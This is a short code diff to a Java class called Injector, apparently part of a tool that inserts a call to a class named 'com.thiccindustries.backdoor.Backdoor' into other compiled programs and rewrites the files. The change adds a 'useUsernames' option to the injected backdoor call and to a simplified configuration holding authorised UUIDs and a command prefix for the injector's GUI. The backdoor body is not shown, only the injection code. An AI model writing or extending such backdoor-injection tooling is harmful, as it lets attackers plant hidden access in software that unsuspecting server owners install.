@@ -93,8 +93,8 @@ public class Injector {
                     sb.append(",");
             }
             sb.append("}");
-            System.out.println("{ new com.thiccindustries.backdoor.Backdoor(this, " + sb.toString() + ", \"" + config.prefix + "\"); }");
-            m.insertAfter("{ new com.thiccindustries.backdoor.Backdoor(this, " + sb.toString() + ", \"" + config.prefix + "\"); }");
+            System.out.println("{ new com.thiccindustries.backdoor.Backdoor(this, " + (config.useUsernames ? "true, " : "false, ") + sb.toString() + ", \"" + config.prefix + "\"); }");
+            m.insertAfter("{ new com.thiccindustries.backdoor.Backdoor(this, " + (config.useUsernames ? "true, " : "false, ") + sb.toString() + ", \"" + config.prefix + "\"); }");
 
             //Write to temporary file
             cc.writeFile(temp.toString());
@@ -212,10 +212,12 @@ public class Injector {
 
     //Simplifed config for injector gui
     public static class SimpleConfig {
+        public boolean useUsernames;
         public String[] UUID;
         public String prefix;
 
-        public SimpleConfig(String[] s1, String s2) {
+        public SimpleConfig(boolean b, String[] s1, String s2) {
+            useUsernames = b;
             UUID = s1;
             prefix = s2;
         }
